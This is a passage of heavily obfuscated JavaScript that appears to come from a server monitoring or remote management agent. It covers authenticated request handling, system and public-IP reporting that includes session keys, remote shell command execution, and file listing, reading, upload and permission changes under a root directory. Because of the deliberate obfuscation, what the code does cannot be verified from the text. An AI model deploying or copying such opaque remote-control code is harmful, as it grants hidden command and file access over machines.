            return a0O[bt(0x2ae)] && f[bt(0x5de)](c[bt(0x118)], c[bt(0x55e)]), g();
        d[bt(0x114)] = ![];
        const j = [
            c['FlcsF'],
            c[bt(0x49a)]
        ];
        if (a0O[bt(0x2ae)])
            return d[bt(0x114)] = !![], g();
        const k = d[bt(0x63c)][c[bt(0x54b)]] || d['headers'][c[bt(0x6f5)]], l = d['headers'][c[bt(0x39c)]] || d[bt(0x63c)][c[bt(0x684)]], m = d['headers'][c[bt(0x55d)]] || d[bt(0x63c)][c[bt(0x334)]];
        if (c[bt(0x19d)](!k, !l) || !m)
            return j['includes'](d[bt(0x6aa)]) ? c[bt(0x612)](g) : f[bt(0x261)](0x191)['json']({ 'error': c['sZKot'] });
        try {
            let n = Buffer[bt(0x36a)](0x0);
            if (d[bt(0x6aa)] !== bt(0x2d3)) {
                if (Buffer[bt(0xc9)](d[bt(0x696)]))
                    n = d[bt(0x696)];
                else {
                    if (c[bt(0x6e1)](typeof d[bt(0x696)], 'string'))
                        n = Buffer[bt(0x3e1)](d['body'], c['DYfgL']);
                }
            }
            const o = c['LObTs'](n['length'], 0x0) ? a0k[bt(0x4e4)](bt(0x3da))[bt(0x3d9)](n)[bt(0x1ad)](bt(0x48a)) : '', p = b ? b['getActiveEcdsaVk']() : null, q = a[bt(0x141)](d[bt(0x1c9)], d[bt(0x6aa)], o, k, l, m, p);
            d['is_authenticated'] = !![], d[bt(0x67b)] = c[bt(0x34c)](q, bt(0x52b)) ? bt(0x52b) : c[bt(0x675)];
        } catch (r) {
            return j[bt(0x572)](d['path']) ? c[bt(0x2fe)](g) : f[bt(0x261)](0x191)[bt(0x493)]({ 'error': bt(0x213) + r[bt(0x322)] });
        }
        if (d['body'] && typeof d[bt(0x696)] === c['foUiz']) {
            const s = (d['headers'][c[bt(0x390)]] || '')[bt(0x2c1)]() === 'true';
            try {
                if (s && d['is_authenticated']) {
                    const t = Buffer['from'](a0O[bt(0x57e)], c[bt(0x286)]), u = a['decryptData'](d[bt(0x696)], t);
                    d[bt(0x696)] = JSON['parse'](u);
                } else {
                    if (d[bt(0x696)][bt(0x562)](c[bt(0x53e)])) {
                        const v = Buffer[bt(0x3e1)](d[bt(0x696)], c[bt(0x286)])[bt(0x496)](c[bt(0x768)]);
                        d['body'] = JSON[bt(0x4b2)](v);
                    } else {
                        if (d[bt(0x696)]['trim']()['startsWith']('{') || d[bt(0x696)][bt(0x5d6)]()[bt(0x562)]('['))
                            d['body'] = JSON[bt(0x4b2)](d[bt(0x696)]);
                        else {
                            if (c[bt(0x485)](d[bt(0x696)][bt(0x5d6)](), ''))
                                d[bt(0x696)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0C[bt(0x5e4)](bt(0x350) + w[bt(0x322)]), f[bt(0x261)](0x190)[bt(0x493)]({ 'error': bt(0x6d0) + w['message'] });
            }
        }
        g();
    };
}
class a0T {
    constructor() {
        const bw = a0aQ, a = {
                'vFpun': function (b, c) {
                    return b / c;
                }
            };
        this[bw(0x14d)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bw(0xf0)] = 0x0, this['totalNetworkDown'] = 0x0, this[bw(0x534)] = a[bw(0x398)](Date[bw(0x5bd)](), 0x3e8);
    }
    async ['getContainerMemory']() {
        const bx = a0aQ, a = {
                'HNdtU': bx(0x38c),
                'LesHj': bx(0x2fd),
                'QoGSi': function (d, f) {
                    return d === f;
                },
                'YcTya': bx(0x1a3),
                'mffwv': function (d, f, g) {
                    return d(f, g);
                },
                'HMbcf': function (d, f, g) {
                    return d(f, g);
                },
                'MZMVI': bx(0x146),
                'Ulmze': function (d, f, g) {
                    return d(f, g);
                },
                'ZSqLn': bx(0x3f6),
                'RfPmq': bx(0x281),
                'VDmhH': function (d, f) {
                    return d === f;
                },
                'ahCfa': function (d, f) {
                    return d(f);
                },
                'RtDle': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m['readFile'](a[bx(0x588)], a[bx(0x187)]))[bx(0x5d6)]();
            b = a[bx(0x2e5)](d, a[bx(0x4c5)]) ? null : a[bx(0x5d0)](parseInt, d, 0xa), c = a[bx(0x437)](parseInt, (await a0m[bx(0x429)](a[bx(0x2d8)], bx(0x2fd)))[bx(0x5d6)](), 0xa);
        } catch {
            try {
                b = a[bx(0xf9)](parseInt, (await a0m[bx(0x429)](a[bx(0x11b)], bx(0x2fd)))[bx(0x5d6)](), 0xa), c = parseInt((await a0m[bx(0x429)](a[bx(0x64b)], a[bx(0x187)]))[bx(0x5d6)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0t['mem']();
                b = f[bx(0x66f)], c = f[bx(0x4a0)];
            }
        }
        if (a[bx(0x69e)](b, null)) {
            const g = await a0t['mem']();
            b = g[bx(0x66f)], (c === null || a[bx(0x5ec)](isNaN, c)) && (c = g[bx(0x4a0)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bx(0x418)](b, c),
            'free': a[bx(0x418)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aQ(0x5c5)]() {
        const by = a0aQ, [a, b, c, d] = await Promise[by(0x47c)]([
                a0t['cpu'](),
                this[by(0x58b)](),
                a0t[by(0x20e)](),
                a0t[by(0xd2)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[by(0x47c)]([
                this[by(0xf1)](),
                this[by(0x426)]()
            ]);
        } catch (h) {
            a0C[by(0x1cc)](by(0x239) + h[by(0x322)], 0x1);
        }
        return {
            'arch': a0o[by(0x392)](),
            'cpu_cores': a[by(0x462)],
            'cpu_name': a[by(0x5a4)],
            'disk_total': (await a0t[by(0x6d8)]())[0x0]?.[by(0x52c)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[by(0x66f)],
            'os': c[by(0x454)] + '\x20' + c[by(0x2c8)],
            'kernel_version': c[by(0x667)],
            'swap_total': b[by(0x56f)],
            'version': a0O[by(0x345)],
            'virtualization': await this[by(0x65d)](),
            'session_key': a0O[by(0x57e)],
            'noise_key': a0O[by(0xbe)]
        };
    }
    [a0aQ(0x720)]() {
        const bz = a0aQ, a = {
                'DaCQt': function (c, d) {
                    return c === d;
                },
                'NRkap': 'IPv4'
            }, b = a0o[bz(0xd2)]();
        for (const c of Object[bz(0x236)](b)) {
            for (const d of b[c]) {
                const f = a[bz(0x4e8)](d['family'], a['NRkap']) || d[bz(0x362)] === 0x4;
                if (f && !d[bz(0x450)]) {
                    if (!/^10\./[bz(0x756)](d[bz(0x6ff)]) && !/^192\.168\./[bz(0x756)](d[bz(0x6ff)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[bz(0x756)](d[bz(0x6ff)]))
                        return d[bz(0x6ff)];
                }
            }
        }
        return null;
    }
    async [a0aQ(0xf1)]() {
        const bA = a0aQ, a = {
                'RCwjc': bA(0x4e1),
                'hpGto': bA(0x177),
                'yexjz': 'https://ipecho.net/plain',
                'sSEvG': bA(0x406)
            }, b = [
                bA(0x205),
                'https://icanhazip.com',
                a[bA(0x5e1)],
                a[bA(0x1fa)],
                a[bA(0x218)],
                a[bA(0x352)],
                bA(0x338)
            ];
        for (const d of b) {
            try {
                const f = await this[bA(0x2bf)](d, 0x4);
                if (f && this[bA(0x263)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[bA(0x263)](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const bB = a0aQ, a = {
                'FsFNX': function (c, d) {
                    return c === d;
                },
                'MoxBd': bB(0x2d6)
            }, b = a0o['networkInterfaces']();
        for (const c of Object[bB(0x236)](b)) {
            for (const d of b[c]) {
                const f = a[bB(0x20b)](d[bB(0x362)], 'IPv6') || a[bB(0x20b)](d[bB(0x362)], 0x6);
                if (f && !d[bB(0x450)]) {
                    if (!d['address']['toLowerCase']()[bB(0x562)](a['MoxBd']))
                        return d[bB(0x6ff)];
                }
            }
        }
        return null;
    }
    async [a0aQ(0x426)]() {
        const bC = a0aQ, a = {
                'eKEPa': bC(0x402),
                'oVMdX': 'https://icanhazip.com',
                'sDCQJ': bC(0x41b)
            }, b = this[bC(0x73d)]();
        if (b && this[bC(0xec)](b))
            return b;
        const c = [
            a[bC(0x557)],
            a[bC(0x4ab)],
            a[bC(0x596)]
        ];
        for (const d of c) {
            try {
                const f = await this[bC(0x2bf)](d, 0x6);
                if (f && this[bC(0xec)](f))
                    return f;
            } catch (g) {
                a0C[bC(0x1cc)](bC(0x44a) + d + bC(0x3bd) + g[bC(0x322)]);
                continue;
            }
        }
        return null;
    }
    async [a0aQ(0x2bf)](a, b = 0x0) {
        const bD = a0aQ, c = {
                'Eyofc': function (d, f) {
                    return d(f);
                },
                'maDNd': bD(0x50a),
                'WolQR': function (d, f) {
                    return d !== f;
                },
                'gdZwz': function (d, f) {
                    return d(f);
                },
                'IEyyw': bD(0x576),
                'ZfErX': 'end'
            };
        return new Promise((d, f) => {
            const bG = bD, g = {
                    'aYFPo': function (k, l) {
                        const bE = a0b;
                        return c[bE(0x749)](k, l);
                    },
                    'RThDE': function (k, l) {
                        const bF = a0b;
                        return c[bF(0xcf)](k, l);
                    },
                    'FSOSq': c['IEyyw'],
                    'vYHtE': c[bG(0x74b)]
                }, h = c[bG(0xcf)](require, bG(0x1b9)), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': bG(0x4aa) }
                }, j = h[bG(0x514)](a, i, k => {
                    const bH = bG;
                    let l = '';
                    if (g['aYFPo'](k[bH(0x51f)], 0xc8)) {
                        g[bH(0x535)](f, new Error(bH(0x68f) + k[bH(0x51f)]));
                        return;
                    }
                    k['on'](g[bH(0x320)], m => l += m), k['on'](g[bH(0x2f4)], () => d(l[bH(0x5d6)]()));
                });
            j['on']('error', f), j['setTimeout'](0x1388, () => {
                const bI = bG;
                j[bI(0x605)](), c[bI(0x470)](f, new Error(c['maDNd']));
            });
        });
    }
    [a0aQ(0x263)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0aQ(0xec)](a) {
        const bJ = a0aQ;
        if (!/^[0-9a-fA-F:]+$/[bJ(0x756)](a) || !a[bJ(0x572)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i['test'](a))
            return ![];
        return !![];
    }
    async ['getRealtimeInfo']() {
        const bK = a0aQ, a = {
                'GJYXW': function (m, n) {
                    return m / n;
                },
                'UTHij': function (m, n) {
                    return m - n;
                },
                'QsZEN': function (m, n) {
                    return m - n;
                },
                'hWKtm': function (m, n) {
                    return m * n;
                },
                'HesQY': function (m, n) {
                    return m / n;
                },
                'xFYzl': function (m, n) {
                    return m / n;
                },
                'hyXjH': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bK(0x47c)]([
                a0t['currentLoad'](),
                a0t['mem'](),
                a0t['networkStats'](),
                a0t[bK(0x108)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bK(0x646)](Date[bK(0x5bd)](), 0x3e8), i = a[bK(0x55c)](h, this[bK(0x534)]), j = g[bK(0x5b4)] - this[bK(0x14d)]['tx'], k = a[bK(0x648)](g[bK(0x70a)], this[bK(0x14d)]['rx']);
        this['totalNetworkUp'] += j, this[bK(0x755)] += k, this[bK(0x14d)] = {
            'tx': g[bK(0x5b4)],
            'rx': g[bK(0x70a)]
        }, this[bK(0x534)] = h;
        const l = await a0t['processes']();
        return {
            'cpu': { 'usage': Math['round'](b[bK(0x108)]) },
            'ram': {
                'total': c['total'],
                'used': c['active']
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c[bK(0x4f3)]
            },
            'load': {
                'load1': a[bK(0x646)](Math[bK(0x72c)](a[bK(0x599)](f[bK(0x2d4)], 0x64)), 0x64),
                'load5': a[bK(0xfe)](Math[bK(0x72c)](a[bK(0x599)](f[bK(0x2d4)], 0x64)), 0x64),
                'load15': Math[bK(0x72c)](a[bK(0x599)](f['avgLoad'], 0x64)) / 0x64
            },
            'disk': await this[bK(0x58f)](),
            'network': {
                'up': Math[bK(0x72c)](a['xFYzl'](j, i)),
                'down': Math[bK(0x72c)](a[bK(0x3d5)](k, i)),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this[bK(0x755)]
            },
            'connections': await this[bK(0x287)](),
            'uptime': a0o[bK(0x516)](),
            'process': l?.[bK(0x47c)] || 0x0,
            'message': ''
        };
    }
    async ['_getVirtualization']() {
        const bL = a0aQ, a = {
                'SniVu': bL(0x45b),
                'eJYhc': '/run/.containerenv',
                'fdXwo': bL(0x1f7),
                'glzWK': bL(0x170),
                'OycMS': bL(0x2fd),
                'GdjDz': bL(0x613),
                'YAkVW': bL(0x590),
                'gdlpm': bL(0x5f4),
                'lltLB': 'lxc',
                'IrbIP': bL(0x466),
                'IqGPg': bL(0x1ac),
                'zvAqJ': '/docker/containers/',
                'Kkzkh': 'workdir=/var/lib/docker',
                'txfsW': bL(0x206),
                'kYLFO': bL(0x3fa),
                'EvEkJ': bL(0x3d1),
                'eMcBN': bL(0x591),
                'SvTGS': '/proc/cpuinfo',
                'QELlZ': 'QEMU',
                'uyHeP': bL(0x5b2),
                'aFEOc': bL(0x5cf)
            };
        try {
            if (a0l[bL(0x124)](bL(0x1a4)))
                return a['SniVu'];
            if (a0l[bL(0x124)](a['eJYhc']))
                return a[bL(0x3ff)];
            if (a0l[bL(0x124)](a[bL(0x571)])) {
                const b = a0l['readFileSync'](a[bL(0x571)], a[bL(0x4c4)])[bL(0x2c1)]();
                if (b['includes']('docker') || b[bL(0x572)](a[bL(0x2a6)]))
                    return a[bL(0x40e)];
                else {
                    if (b[bL(0x572)](a[bL(0x5d8)]))
                        return a['gdlpm'];
                    else {
                        if (b[bL(0x572)](a['lltLB']))
                            return a['IrbIP'];
                    }
                }
            }
            if (a0l['existsSync'](bL(0x1ac))) {
                const c = a0l[bL(0x598)](a[bL(0x4dc)], a['OycMS']);
                if (c[bL(0x572)](a[bL(0x273)]) || c[bL(0x572)](a[bL(0x4d4)]))
                    return a[bL(0x40e)];
                else {
                    if (c[bL(0x572)](a[bL(0x297)]) || c['includes'](a[bL(0x3c0)]))
                        return bL(0x5f4);
                }
            }
            if (a0l[bL(0x124)](bL(0x3d1))) {
                const d = a0l[bL(0x598)](a[bL(0x758)], a[bL(0x4c4)]);
                if (d['includes'](a[bL(0x76f)]))
                    return bL(0x466);
            }
            if (a0l[bL(0x124)](a[bL(0xf4)])) {
                const f = a0l[bL(0x598)](a[bL(0xf4)], a[bL(0x4c4)]);
                if (f[bL(0x572)](a['QELlZ']) || f[bL(0x572)](a[bL(0x75a)]))
                    return a[bL(0x663)];
            }
        } catch (g) {
        }
        return a[bL(0x449)];
    }
    async [a0aQ(0x58f)]() {
        const bM = a0aQ, a = {
                'BFIHE': function (b, c) {
                    return b !== c;
                },
                'vvmEs': bM(0xe6)
            };
        try {
            const b = await a0t[bM(0x6d8)](), c = b[bM(0x72f)](g => {
                    const bN = bM;
                    return g[bN(0x52c)] > 0x0 && a[bN(0x56e)](g['type'], a[bN(0x53a)]) && a[bN(0x56e)](g[bN(0x6ef)], bN(0x3f9)) && g['fs'][bN(0x562)](bN(0x77c));
                }), d = c[bM(0x617)]((g, h) => g + h['size'], 0x0), f = c['reduce']((g, h) => g + h[bM(0x4a0)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aQ(0x287)]() {
        const bO = a0aQ;
        try {
            const a = await a0t['networkConnections'](), b = a['filter'](d => d[bO(0x6fa)] === bO(0x407))[bO(0x4a5)], c = a[bO(0x72f)](d => d[bO(0x6fa)] === bO(0x5b8))[bO(0x4a5)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0U {
    static async [a0aQ(0x659)](a, b = {}) {
        const bP = a0aQ, c = {
                'LJxDt': function (d, f) {
                    return d - f;
                },
                'NirZN': function (d, f) {
                    return d || f;
                },
                'gcidD': bP(0x6ee),
                'OSijy': function (d, f) {
                    return d(f);
                },
                'sISNl': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'JsiUT': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bP(0x2f7)](),
                env: env = {},
                timeout: timeout = a0O['Rtimeout']
            } = b;
        return new Promise(d => {
            const bQ = bP, f = Date[bQ(0x5bd)](), g = c[bQ(0x759)](a0q, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[bQ(0x10b)](timeout, 0x3e8),
                    'maxBuffer': c[bQ(0x10b)](0xa, 0x400) * 0x400
                }, (h, i, j) => {
                    const bR = bQ, k = c[bR(0x531)](Date[bR(0x5bd)](), f), l = h && h[bR(0x475)] && h[bR(0x653)];
                    let m = c[bR(0x4b6)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            typeof h[bR(0x3b8)] === c['gcidD'] ? n = h[bR(0x3b8)] : n = -0x1;
                    }
                    c[bR(0x33d)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0V(a) {
    const bS = a0aQ, b = {
            'buPXJ': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[bS(0x127)]['native'](a0n[bS(0xd7)](a0O[bS(0x167)])), d = a0n['resolve'](a);
        let f = d;
        while (!a0l[bS(0x124)](f)) {
            const j = a0n[bS(0x2b2)](f);
            if (b[bS(0x13e)](j, f))
                return ![];
            f = j;
        }
        const g = a0l[bS(0x127)][bS(0x74f)](f), h = a0n['relative'](c, g);
        if (h[bS(0x562)]('..') || a0n[bS(0x654)](h))
            return ![];
        const i = a0n['relative'](f, d);
        if (i && (i[bS(0x562)]('..') || a0n[bS(0x654)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0W {
    static async ['listFiles'](a, b = ![]) {
        const bT = a0aQ, c = {
                'pjkfO': bT(0x26f),
                'NOcpL': 'file',
                'OmHcm': function (h, i) {
                    return h & i;
                },
                'LAjTZ': function (h, i) {
                    return h || i;
                },
                'dBBtW': function (h, i) {
                    return h(i);
                },
                'KBcfH': bT(0x252),
                'EfIgr': bT(0x762)
            }, d = a0n[bT(0xd7)](a0O[bT(0x167)], c[bT(0x1e6)](a, '.'));
        if (!c[bT(0x546)](a0V, d))
            throw new Error(c['KBcfH']);
        if (!a0l[bT(0x124)](d))
            throw new Error(c[bT(0x44c)]);
        const f = [], g = h => {
                const bU = bT, i = a0l['readdirSync'](h);
                for (const j of i) {
                    const k = a0n[bU(0x211)](h, j), l = a0l[bU(0x1a2)](k), m = new a0K();
                    m[bU(0x2f6)] = j, m['path'] = a0n['relative'](a0O[bU(0x167)], k), m[bU(0x6ef)] = l[bU(0x479)]() ? c[bU(0x4b7)] : c[bU(0x1f1)], m['size'] = l[bU(0x52c)], m[bU(0xff)] = l[bU(0xff)][bU(0x4f9)](), m[bU(0x608)] = this[bU(0xbb)](l[bU(0x608)], l['isDirectory']()), m[bU(0x615)] = '0o' + c['OmHcm'](l[bU(0x608)], 0x1ff)[bU(0x496)](0x8), m[bU(0x4ae)] = l[bU(0x5d2)] + ':' + l[bU(0x536)], f[bU(0x33a)](m), b && l[bU(0x479)]() && g(k);
                }
            };
        return c[bT(0x546)](g, d), f;
    }
    static async [a0aQ(0x76b)](a) {
        const bV = a0aQ, b = {
                'NRwHJ': function (d, f) {
                    return d(f);
                },
                'CwFRE': 'directory',
                'btAgl': bV(0x43c)
            }, c = [];
        for (const d of a) {
            const f = a0n[bV(0xd7)](a0O[bV(0x167)], d);
            if (!b[bV(0x4ac)](a0V, f))
                continue;
            try {
                const g = a0l['statSync'](f), h = this[bV(0x405)](f, a0l[bV(0xfd)][bV(0x161)]), i = this[bV(0x405)](f, a0l[bV(0xfd)]['W_OK']), j = this[bV(0x405)](f, a0l[bV(0xfd)]['X_OK']), k = new a0L();
                k['path'] = a0n['relative'](a0O[bV(0x167)], f), k[bV(0x2f6)] = a0n[bV(0x131)](f), k[bV(0x608)] = this[bV(0xbb)](g['mode'], g['isDirectory']()), k[bV(0x615)] = '0o' + (g[bV(0x608)] & 0x1ff)[bV(0x496)](0x8), k['type'] = g[bV(0x479)]() ? b[bV(0x268)] : b[bV(0x1a0)], k[bV(0x1cb)] = h, k[bV(0x507)] = i, k[bV(0x1c7)] = j, c[bV(0x33a)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static ['_checkAccess'](a, b) {
        const bW = a0aQ;
        try {
            return a0l[bW(0x36b)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const bX = a0aQ, b = {
                'DWOQA': function (c, d) {
                    return c === d;
                },
                'swrka': 'number',
                'sWmlg': function (c, d) {
                    return c === d;
                },
                'zpIgv': bX(0x33e)
            };
        if (b[bX(0x6d9)](typeof a, b[bX(0x282)]))
            return a;
        if (b[bX(0x38e)](typeof a, b[bX(0x24a)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[bX(0x756)](c))
                return parseInt(c, 0x8);
        }
        throw new Error(bX(0x730));
    }
    static [a0aQ(0xbb)](a, b) {
        const bY = a0aQ, c = {
                'HAfdN': function (i, j) {
                    return i & j;
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[bY(0x3c7)](a, 0x1ff)[bY(0x496)](0x8)[bY(0x42d)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = parseInt(i, 0xa);
            h += f[bY(0x4a1)]((k, l) => j & 0x4 >> l ? k : '-')[bY(0x211)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const bZ = a0aQ, c = {
                'nggDn': function (g, h) {
                    return g(h);
                },
                'SkGKa': bZ(0x241),
                'coyKn': bZ(0x5e4)
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0n[bZ(0xd7)](a0O[bZ(0x167)], g);
            if (!a0V(i)) {
                d[bZ(0x33a)]({
                    'path': g,
                    'requested': c[bZ(0x6f1)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['SkGKa']
                });
                continue;
            }
            try {
                const j = this[bZ(0x3d0)](h), k = m => {
                        const c0 = bZ;
                        a0l[c0(0x472)](m, j);
                    };
                if (b && a0l[bZ(0x124)](i) && a0l[bZ(0x1a2)](i)[bZ(0x479)]()) {
                    const m = n => {
                        const c1 = bZ;
                        k(n);
                        const o = a0l[c1(0x351)](n);
                        for (const p of o) {
                            const q = a0n[c1(0x211)](n, p);
                            a0l[c1(0x1a2)](q)[c1(0x479)]() ? c[c1(0x6f1)](m, q) : c[c1(0x6f1)](k, q);
                        }
                    };
                    c[bZ(0x6f1)](m, i);
                } else
                    c[bZ(0x6f1)](k, i);
                const l = j['toString'](0x8);
                d[bZ(0x33a)]({
                    'path': g,
                    'requested': c[bZ(0x6f1)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[bZ(0x33a)]({
                    'path': g,
                    'requested': c[bZ(0x6f1)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[bZ(0x495)],
                    'message': n[bZ(0x322)]
                });
            }
        }
        const f = d['filter'](o => o[bZ(0x261)] === 'ok')[bZ(0x4a5)];
        return {
            'status': 'ok',
            'total': d[bZ(0x4a5)],
            'success': f,
            'results': d
        };
    }
    static async [a0aQ(0x429)](a) {
        const c2 = a0aQ, b = {
                'OKYgF': function (h, i) {
                    return h(i);
                },
                'oqDmV': function (h, i) {
                    return h > i;
                },
                'wbJQX': function (h, i) {
                    return h * i;
                },
                'LCMmd': c2(0x712),
                'ULAeF': c2(0x2fd),
                'qUrwv': c2(0x4d6),
                'zonxu': c2(0x448)
            }, c = a0n[c2(0xd7)](a0O[c2(0x167)], a);
        if (!b['OKYgF'](a0V, c))
            throw new Error(c2(0x252));
        const d = a0l['statSync'](c);
        if (b[c2(0x203)](d['size'], b[c2(0x251)](0x400, 0x400)))
            throw new Error(b[c2(0x155)]);
        const f = a0l[c2(0x598)](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0n['relative'](a0O['FILE_ROOT'], c),
            'content': g ? a0v[c2(0x424)](f) : f[c2(0x496)](b[c2(0x6b1)]),
            'encoding': g ? b['qUrwv'] : b[c2(0x70b)],
            'is_binary': g,
            'size': d[c2(0x52c)]
        };
    }
    static ['_isBinary'](a) {
        const c3 = a0aQ, b = {
                'EDeFR': function (c, d) {
                    return c === d;
                },
                'EFbAC': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b[c3(0x6cc)](a[c3(0x4a5)], 0x0))
            return ![];
        for (let c = 0x0; b[c3(0x46e)](c, Math[c3(0x360)](a['length'], 0x200)); c++) {
            if (a[c] === 0x0)
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const c4 = a0aQ, g = {
                'VAlIV': function (l, m) {
                    return l(m);
                },
                'dLSvV': 'Access\x20denied:\x20path\x20outside\x20root',
                'dbiEO': function (l, m) {
                    return l > m;
                },
                'BOCip': c4(0x712),
                'kOekr': function (l, m) {
                    return l !== m;
                },
                'nsWcw': c4(0x487),
                'XoNFR': '.upload_chunks',
                'PcUZF': function (l, m) {
                    return l === m;
                }
            }, h = a0n['resolve'](a0O[c4(0x167)], a);
        let j = h;
        b && (j = a0n[c4(0x211)](h, b));
        if (!g['VAlIV'](a0V, j))
            throw new Error(g['dLSvV']);
        !a0l[c4(0x124)](a0n[c4(0x2b2)](j)) && a0l[c4(0x4e2)](a0n[c4(0x2b2)](j), { 'recursive': !![] });
        const k = a0v[c4(0x595)](c);
        if (g[c4(0x215)](k['length'], a0O[c4(0x447)]))
            throw new Error(g[c4(0x31e)]);
        if (g[c4(0x181)](d, null) && g[c4(0x181)](f, null)) {
            const l = g['VAlIV'](Number, d), m = g[c4(0xe9)](Number, f);
            if (Number[c4(0x43a)](l) || Number[c4(0x43a)](m))
                throw new Error(g[c4(0x275)]);
            const n = a0n[c4(0x211)](a0n['dirname'](j), g[c4(0x299)], a0n[c4(0x131)](j));
            !a0l[c4(0x124)](n) && a0l[c4(0x4e2)](n, { 'recursive': !![] });
            const o = a0n[c4(0x211)](n, c4(0x722) + l);
            a0l[c4(0xb1)](o, k);
            const p = a0l[c4(0x351)](n)['filter'](s => s[c4(0x562)]('chunk_')), q = p['length'], r = g[c4(0x72d)](q, m);
            if (r) {
                const s = a0l[c4(0x504)](j);
                for (let u = 0x0; u < m; u++) {
                    const v = a0n[c4(0x211)](n, c4(0x722) + u);
                    if (!a0l[c4(0x124)](v)) {
                        s['close']();
                        throw new Error(c4(0x309) + u);
                    }
                    s['write'](a0l[c4(0x598)](v));
                }
                s[c4(0x4e5)]();
                const t = a0n[c4(0x2b2)](n);
                a0l['rmSync'](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[c4(0x4da)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0n[c4(0x56b)](a0O[c4(0x167)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[c4(0xb1)](j, k), {
            'status': 'ok',
            'path': a0n[c4(0x56b)](a0O[c4(0x167)], j),
            'received': k[c4(0x4a5)],
            'total': k[c4(0x4a5)],
            'chunked': ![]
        };
    }
    static async [a0aQ(0x250)](a, b, c, d = null, f = null) {
        const c5 = a0aQ, g = {
                'qlwCY': function (k, l) {
                    return k || l;
                },
                'ghIon': function (k, l) {
                    return k(l);
                },
                'caeCz': 'Access\x20denied:\x20path\x20outside\x20root',
                'UNqxi': function (k, l) {
                    return k > l;
                },
                'odGbI': function (k, l) {
                    return k !== l;
                },
                'gTXeh': c5(0x487),
                'ECjhQ': function (k, l) {
                    return k < l;
                },
                'kTNIH': c5(0x46b),
                'GkVlt': c5(0x62b)
            }, h = a0n[c5(0xd7)](a0O[c5(0x167)], g[c5(0x348)](a, '.'));
        let j = h;
        b && (j = a0n[c5(0x211)](h, b));
        if (!g[c5(0x376)](a0V, j))
            throw new Error(g['caeCz']);
        !a0l['existsSync'](a0n[c5(0x2b2)](j)) && a0l[c5(0x4e2)](a0n[c5(0x2b2)](j), { 'recursive': !![] });
        if (g[c5(0x188)](c['length'], a0O[c5(0x447)]))
            throw new Error('File\x20too\x20large');
        if (g[c5(0x782)](d, null) && f !== null) {
            const k = Number(d), l = g[c5(0x376)](Number, f);
            if (Number['isNaN'](k) || Number[c5(0x43a)](l))
                throw new Error(g[c5(0x2d1)]);
            const m = a0n['join'](a0n[c5(0x2b2)](j), c5(0x77d), a0n[c5(0x131)](j));
            !a0l[c5(0x124)](m) && a0l[c5(0x4e2)](m, { 'recursive': !![] });
            const n = a0n[c5(0x211)](m, c5(0x722) + k);
            a0l['writeFileSync'](n, c);
            const o = a0l[c5(0x351)](m)[c5(0x72f)](r => r[c5(0x562)](c5(0x722))), p = o[c5(0x4a5)], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[c5(0x1eb)](t, l); t++) {
                    const u = a0n['join'](m, c5(0x722) + t);
                    if (!a0l[c5(0x124)](u))
                        throw new Error(c5(0x309) + t);
                    r[c5(0x33a)](a0l['readFileSync'](u));
                }
                a0l[c5(0xb1)](j, Buffer[c5(0x147)](r));
                const s = a0n[c5(0x2b2)](m);
                a0l['rmSync'](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
